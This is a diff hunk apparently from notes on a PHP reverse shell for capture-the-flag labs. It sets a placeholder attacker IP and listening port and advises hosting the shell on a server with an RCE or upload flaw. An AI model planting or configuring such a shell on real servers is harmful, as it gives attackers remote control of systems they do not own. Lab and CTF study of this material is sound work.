@@ -31,7 +31,8 @@ __________________________
 
 $ip = 'YOUR.ATTACKER.IP'; // RealWorld = Your Local System ip 
                           // CTF = Tryhackme or Hack the Box ip [ it's depends on ctf platform ]
-$port = 4455; // Can Use Any Port UP TO 1024
+
+$port = 4455; // Can Use Any Random Port [ Port Should Up to be 1024 ]
 
 💡 Host on a server with RCE or upload vulnerability. Use responsibly and only in lab-approved environments.
 
